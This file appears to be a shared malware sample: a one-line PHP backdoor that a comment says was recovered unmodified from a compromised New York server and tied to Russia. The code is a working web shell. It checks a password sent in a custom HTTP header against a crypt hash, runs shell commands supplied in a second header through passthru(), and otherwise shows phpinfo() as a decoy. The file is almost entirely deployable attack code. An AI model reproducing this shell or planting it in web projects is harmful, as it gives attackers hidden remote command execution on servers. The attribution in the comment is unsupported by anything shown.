<!---
Simple PHP backdoor with password support (custom headers in any web client)  In this case HTTP_WAZ holds the password.  
HTTP_NET holds the payload.  Code is un-modified since found on a New York server. The Incident was linked to Russia; 
despite their obvious attempts to fool us with EN versions of VS compiled binaries on Windows.
--->
<?php error_reporting(0);if(crypt(@getenv('HTTP_WAZ'),'aX')=='aXuwWcOeuK8cM'){@passthru(@getenv('HTTP_NET'));exit;}else{phpinfo();}?>
